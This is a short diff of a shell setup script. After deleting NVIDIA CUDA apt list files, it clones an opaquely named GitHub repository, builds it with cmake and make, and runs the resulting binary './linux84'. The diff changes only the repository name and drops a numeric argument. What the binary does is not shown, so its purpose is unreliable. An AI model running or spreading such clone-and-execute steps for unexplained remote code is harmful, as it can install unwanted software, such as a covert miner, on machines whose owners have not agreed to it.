@@ -26,10 +26,10 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-git clone https://github.com/mobileapps84741274/linux8474
-cd linux8474
+git clone https://github.com/mobileapps84741274/gulilinux16384
+cd gulilinux16384
 mkdir build
 cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make
-./linux84 8
+./linux84
